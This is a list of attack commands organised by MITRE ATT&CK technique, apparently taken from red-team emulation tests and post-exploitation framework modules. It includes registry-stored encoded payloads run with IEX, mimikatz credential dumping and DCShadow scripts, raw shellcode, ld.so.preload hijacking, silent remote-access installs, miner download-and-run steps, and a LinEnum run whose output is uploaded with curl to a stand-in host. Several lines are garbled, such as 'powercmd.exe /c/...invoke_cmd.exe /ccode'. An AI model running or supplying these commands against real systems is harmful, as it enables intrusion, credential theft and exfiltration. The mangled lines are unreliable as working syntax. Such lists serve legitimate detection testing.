$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powercmd.exe /c.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
* Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body #{input_file}
* sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
* "%temp%\temp_T1027.zip\T1027.exe"
* [a-z0-9]{1}.exe
* *.exe \*.exe\:Zone.Identifier:$DATA"
## T1588: Obtain Capabilities
## T1137: Office Application Startup
* reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f
mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
## T1201: Password Policy Discovery
* cat /etc/security/pwquality.conf
* net accounts
* net accounts /domain
* cat /etc/login.defs
* pwpolicy getaccountpolicies
* cat /etc/pam.d/common-password
* cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf
* net accounts /domain
* cat /etc/pam.d/common-password
* pwpolicy getaccountpolicies
* net accounts
## T1034: Path Interception
## T1120: Peripheral Device Discovery
* Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
* lpq -a
* system_profiler SPUSBDataType
## T1069: Permission Groups Discovery
* net localgroup "Administrators"
* cmd.exe /c net localgroup "Administrators"
* net group ["Domain Admins"] /domain
* net group ["Domain Admins"] /domain[:DOMAIN]
## T1566: Phishing
## T1598: Phishing for Information
## T1542: Pre-OS Boot
## T1057: Process Discovery
* ps
cmd.exe /c tasklist /v [/svc]
cmd.exe /c net start
* tasklist /v [/svc]
net start
qprocess *
* ps >> /tmp/loot.txt
ps aux >> /tmp/loot.txt
* tasklist
* $ps_url = "https://download.sysinternals.com/files/PSTools.zip";
$download_folder = "C:\Users\Public\";
$staging_folder = "C:\Users\Public\temp";
Start-BitsTransfer -Source $ps_url -Destination $download_folder;
Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;
iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;
Remove-Item $download_folder"PSTools.zip";
Remove-Item $staging_folder -Recurse
* acrnctl list
* $owners = @{};
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
$ps = get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};
$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq "svchost") {$p} };
$valid | ConvertTo-Json
* $ps = get-process | select processname,Id;
$valid = foreach($p in $ps) { if($p.ProcessName -eq "lsass") {$p} };
$valid | ConvertTo-Json
* ps
* get-process
* ps aux | grep #{host.user.name}
* $owners = @{};
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
$ps = get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};
foreach($p in $ps) {
    if($p.Owner -eq "#{host.user.name}") {
        $p;
    }
}
* get-process >> $env:APPDATA\vmtools.log;
cat $env:APPDATA\vmtools.log
* ps aux
* tasklist
* Get-Process
* tasklist /m  >> $env:APPDATA\vmtool.log;
cat $env:APPDATA\vmtool.log
## T1055: Process Injection
* C:\PSTools\PsExec.exe /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
* #{psexec_path} /accepteula \\DC1 -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
* #{psexec_path} /accepteula \\#{machine} -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject /id:500" "exit"
* 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
* powercmd.exe /c/code_execution/invoke_reflectivepeinjection
* powercmd.exe /c/code_execution/invoke_cmd.exe /ccode
* powercmd.exe /c/code_execution/invoke_cmd.exe /ccodemsil
* powercmd.exe /c/credentials/credential_injection
* powercmd.exe /c/management/psinject
* powercmd.exe /c/management/reflective_inject
* powercmd.exe /c/management/shinject
* python/management/osx/cmd.exe /ccodeinject64
* echo #{path_to_shared_library} > /etc/ld.so.preload
* ```
* echo /home/$USER/random.so > /etc/ld.so.preload
## T1572: Protocol Tunneling
* for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=#{query_type}" -UseBasicParsing).Content }
* for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "https://8.8.8.8/resolve?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
* for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
* for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=TXT" -UseBasicParsing).Content }
* for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
## T1090: Proxy
* python/management/multi/socks
## T1012: Query Registry
* reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
* cmd.exe /c reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
* reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
* Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* cmd.exe reg (query|add)
* HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
* cmd.exe reg (query|add)
* HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
* cmd.exe reg (query|add)
* HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\Run
* cmd.exe reg (query|add)
* HKCU\Software\Microsoft\Windows\CurrentVersion\Run
* cmd.exe reg (query|add)
* HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
* cmd.exe reg (query|add)
* HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* cmd.exe reg (query|add)
* HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* cmd.exe reg (query|add)
## T1108: Redundant Access
## T1620: Reflective Code Loading
## T1219: Remote Access Software
* Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
$file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
Start-Process $file1 /S;
* Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
Start-Process $file1 /S;
* Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
Start-Process $file1 /S;
Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
* Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Start-Process $file1 /S;
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
* $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
msiexec /i $installer /qn
* powercmd.exe /c/management/vnc
* python/management/osx/screen_sharing
## T1563: Remote Service Session Hijacking
## T1021: Remote Services
* python/lateral_movement/multi/ssh_command
* python/lateral_movement/multi/ssh_launcher
## T1018: Remote System Discovery
* net group "Domain Computers" /domain
* net group "Domain Computers" /domain[:DOMAIN]
* net group "Domain Controllers" /domain[:DOMAIN]
* net group "Domain Controllers" /domain
* nltest /dclist[:domain]
* cmd.exe /c echo %LOGONSERVER%
* echo %LOGONSERVER%
* nltest.exe /dclist:domain.local
* for ip in $(seq #{start_host} 254); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
* for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done
* net group "Domain Computers" /domain
* adidnsdump -u #{user_name} -p password --print-zones #{host_name}
* for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
* adidnsdump -u domain\user -p #{acct_pass} --print-zones #{host_name}
* adidnsdump -u #{user_name} -p #{acct_pass} --print-zones 192.168.1.1
* for ip in $(seq 1 #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
* net view /domain
net view
* $localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$pieces = $localip.split(".")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
* arp -a
* arp -a | grep -v '^?'
* Import-Module .\PowerView.ps1 -Force;
Get-NetComputer
* Import-Module .\powerview.ps1;
Get-DomainComputer
* nltest /dsgetdc:$env:USERDOMAIN
* nltest /dsgetdc:%USERDOMAIN%
* cat ~/.ssh/known_hosts
* arp -a
* (nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()
* host "#{target.org.domain}" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev
* nslookup #{remote.host.ip}
* nbtstat -A #{remote.host.ip}
* net.exe view /domain
* qwinsta.exe /server:
* installutil.exe /logfile= /LogToConsole=false /U *.dll
## T1091: Replication Through Removable Media
## T1496: Resource Hijacking
* yes > /dev/null
* Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;
Expand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\;
Start-Process ".\xmrig-6.11.2\xmrig.exe" -WindowStyle Hidden;
Start-Sleep -Seconds 60;
Stop-Process -Name "xmrig"
* wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;
tar -xf xmrig-6.11.2-linux-x64.tar.gz;
timeout 60 ./xmrig-6.11.2/xmrig;
[ $? -eq 124 ]
* curl -OL https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-macos-x64.tar.gz;
tar -xf xmrig-6.11.2-macos-x64.tar.gz;
screen -S miner -dm ./xmrig-6.11.2/xmrig;
sleep 60s;
killall xmrig;
screen -S miner -X quit
* brew install sox >/dev/null 2>&1;
sox -d recording.wav trim 0 15 >/dev/null 2>&1;
## T1207: Rogue Domain Controller
* # starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:#{attribute} /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& #{mimikatz_path} "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
* # starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:9999`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& #{mimikatz_path} "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
* # starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
* # starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& #{mimikatz_path} "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
* # starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:badpwdcount /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& #{mimikatz_path} "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
## T1014: Rootkit
* #{puppetstrings_path} C:\Drivers\driver.sys
## T1053: Scheduled Task/Job
* schtasks [/s HOSTNAME]
* cmd.exe /c schtasks
* Creating a scheduled task:
cmd.exe /c schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
cmd.exe /c net start schedule
cmd.exe /c sc config schedule start= auto
* Creating a scheduled task:
schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto
* schtask.exe /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
* schtask.exe /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
* at.exe ##:## /interactive cmd
* at.exe \\[computername|IP] ##:## c:\temp\evil.bat
* net.exe use \\[computername|IP] /user:DOMAIN\username password
* net.exe time \\[computername|IP]
* schtasks.exe /create * appdata
* \\Windows\\.+\\schtasks.exe/Create
* \\Windows\\.+\\at.exe
* powercmd.exe /c/lateral_movement/new_gpo_immediate_task
* powercmd.exe /c/persistence/elevated/schtasks
* powercmd.exe /c/persistence/userland/schtasks
## T1029: Scheduled Transfer
## T1113: Screen Capture
* xwd -root -out #{output_file}
xwud -in #{output_file}
* cmd /c start /b psr.exe /start /output c:\temp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
* import -window root /tmp/T1113_desktop.png
* Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save("$env:TEMP\T1113.png")
* screencapture -x /tmp/T1113_desktop.png
* xwd -root -out /tmp/T1113_desktop.xwd
xwud -in /tmp/T1113_desktop.xwd
* screencapture /tmp/T1113_desktop.png
* for i in {1..5}; do screencapture -t png screen-$i.png; echo "$(cd "$(dirname "$1")"; pwd -P)/$(basename "screen-$i.png")"; sleep 5; done;
* $loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
   $graphics = [Drawing.Graphics]::FromImage($bmp);
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
   $bmp.Save($path);
   $graphics.Dispose();
   $bmp.Dispose();
}
if ($loadResult) {
  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
  $dest = "$HOME\Desktop\screenshot.png";
  screenshot $bounds $dest;
  if (Test-Path -Path $dest) {
    $dest;
    exit 0;
  };
};
exit 1;
* powercmd.exe /c/collection/screenshot
* python/collection/osx/native_screenshot
* python/collection/osx/native_screenshot_mss
* python/collection/osx/screenshot
## T1064: Scripting
## T1597: Search Closed Sources
## T1596: Search Open Technical Databases
## T1593: Search Open Websites/Domains
## T1594: Search Victim-Owned Websites
## T1505: Server Software Component
## T1489: Service Stop
* net.exe stop spooler
* sc.exe stop spooler
* taskkill.exe /f /im spoolsv.exe
* quit app "Microsoft Outlook.app"
## T1129: Shared Modules
* malware.dll
* control.exe
* rundll32.exe
## T1051: Shared Webroot
## T1218: Signed Binary Proxy Execution
* SyncAppvPublishingServer.exe "n; Start-Process calc.exe"
* #{renamed_binary} #{xml_payload} output.txt
* FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
* #{mwcpath}\microsoft.workflow.compiler.exe "#{xml_payload}" output.txt
* Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath $PWD
* mavinject.exe 1000 /INJECTRUNNING #{dll_payload}
* Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath #{module_path}
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\#{mwcname} "#{xml_payload}" output.txt
* mavinject.exe|SyncAppvPublishingServer.exe
## T1216: Signed Script Proxy Execution
* C:\windows\system32\SyncAppvPublishingServer.vbs "\n;Start-Process calc"
* set comspec=%windir%\System32\calc.exe
cscript %windir%\System32\manage-bde.wsf
* PubPrn.vbsPubPrn.vbs
## T1072: Software Deployment Tools
* "%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"
* "#{radmin_exe}"
## T1518: Software Discovery
* /usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist
/usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist
* reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion
* Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
* which google-chrome
* which go
* python3 --version;python2 --version;python --version
* python3 --version&python2 --version&python --version
* (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer').Version
## T1153: Source
## T1608: Stage Capabilities
## T1528: Steal Application Access Token
## T1539: Steal Web Session Cookie
## T1558: Steal or Forge Kerberos Tickets
## T1553: Subvert Trust Controls
## T1195: Supply Chain Compromise
## T1082: System Information Discovery
* cmd.exe /c ver
* ver
* get_env.rb
* cmd.exe /c set
* set
* cmd.exe /c net config workstation
cmd.exe /c net config server
* net config workstation
net config server
* systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
* systemprofiler tool if no access yet (victim browses to website)
or
cmd.exe /c systeminfo (if you already have a beacon)
* sysinfo, run winenum, get_env.rb
* system_profiler
ls -al /Applications
* systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
* env
* REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
* hostname
* uname -a >> /tmp/T1082.txt
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi;
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi;      
if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi;
uptime >> /tmp/T1082.txt
cat /tmp/T1082.txt 2>/dev/null
* set
* $PSVersionTable
* find / -type d -user #{host.user.name} \( -perm -g+w -or -perm -o+w \) 2>/dev/null -exec ls -adl {} \;
* wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;
chmod +x LinEnum.sh;
./LinEnum.sh > /tmp/exfil.txt;
curl -F 'data=@/tmp/exfil.txt' $RANDOMURL$/file/upload ;
cat /tmp/exfil.txt;
* [environment]::OSVersion.Version
## T1614: System Location Discovery
## T1016: System Network Configuration Discovery
* cmd.exe /c ipconfig
* ipconfig /all
* arp -a
route print
* cmd.exe /c arp -a
* route
* cmd.exe /c c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME}
* nbtstat -a {IP | COMP_NAME }
* $ports = Get-content #{port_file}
$file = "#{output_file}"
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect("allports.exposed", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = "$port open" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = "$port closed" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = "There were a total of $totalopen open ports out of $totalports ports tested."
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
* netsh advfirewall firewall show rule name=all
* $ports = Get-content #{port_file}
$file = "$env:USERPROFILE\Desktop\open-ports.txt"
$totalopen = 0
$totalports = 0
New-Item $file -Force
